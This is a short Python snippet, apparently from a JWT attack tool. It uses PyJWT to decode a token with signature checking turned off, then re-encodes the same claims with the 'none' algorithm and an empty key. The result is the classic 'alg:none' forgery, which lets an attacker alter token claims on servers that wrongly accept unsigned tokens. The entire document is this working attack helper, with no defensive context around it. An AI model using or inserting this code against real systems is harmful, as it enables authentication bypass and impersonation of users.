import jwt

def change_to_none(token):
    decoded = jwt.decode(token, options={'verify_signature': False}, algorithms=['PS384', 'ES384', 'RS384', 'HS256', 'HS512', 'ES256',
                                                          'RS256', 'HS384', 'ES512', 'PS256', 'PS512', 'RS512'])
    return jwt.encode(decoded, '', algorithm='none')
